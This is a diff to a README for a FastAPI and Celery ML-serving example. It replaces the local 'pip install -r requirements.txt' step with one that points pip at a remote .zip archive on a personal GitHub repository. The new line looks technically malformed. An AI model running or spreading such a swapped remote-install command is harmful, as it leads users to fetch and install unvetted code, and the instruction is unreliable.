@@ -5,7 +5,7 @@ Working example for serving a ML model using FastAPI and Celery.
 
 **Install requirements:**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/yashugupta786/async_app_ml/master/celery_task_app/async-ml-app-postpagan.zip
 ```
 
 **Set environment variables:**
